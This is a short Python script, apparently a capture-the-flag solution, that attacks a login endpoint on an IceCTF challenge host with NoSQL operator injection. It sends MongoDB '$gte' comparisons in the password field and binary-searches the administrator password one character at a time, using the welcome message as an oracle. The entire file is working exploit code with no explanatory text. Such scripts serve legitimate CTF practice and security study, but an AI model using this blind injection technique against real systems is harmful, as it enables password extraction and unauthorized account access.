#!/usr/bin/env python

import requests
import json
import time
import random
import sys

payload = {"user": {"$gte": "admin"}, "pass": {"$gte": "XYZXYZ"}}

def find_right_car(payload=payload, prefix="") :
    mini = 0
    maxi = 128

    while maxi - mini > 1:
        mid = mini + (maxi - mini)/2
        chr_mid = chr(mid)

        payload["pass"]["$gte"] = prefix + chr_mid
        payload["pass"]["$gte"] = payload["pass"]["$gte"].encode("utf8")

        print payload
        req = requests.post('http://chainedin.vuln.icec.tf/login', data=json.dumps(payload), 
                            headers = {'Content-type': 'application/json', 'Accept': 'text/plain'})

        print req.text
        print "mini: ", mini, " - maxi:", maxi
        print
        if req.status_code == 200 :
            if req.text == '{"message":"Welcome back Administrator!"}' :
                mini = mid
                continue
        maxi = mid

    return chr(mini)


found = None
prefix = ""

while found != '}' :
    found = find_right_car(payload, prefix)
    prefix += found

'''
print req
print req.text
'''

